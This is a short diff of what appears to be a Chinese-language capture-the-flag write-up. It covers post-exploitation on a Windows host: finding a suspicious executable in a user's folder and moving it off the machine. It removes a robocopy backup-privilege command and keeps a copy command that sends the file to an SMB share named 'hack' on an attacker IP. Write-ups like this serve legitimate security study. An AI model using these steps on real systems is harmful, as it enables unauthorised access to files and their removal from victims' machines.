@@ -263,8 +263,6 @@ root.xml:
 
 在c:\users\twilliams下发现可疑exe
 
-    robocopy /b twilliams xyan1d3
-
 该exe执行之后报错，将其传回攻击机：
 
     copy "definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe" \\10.14.39.48\hack
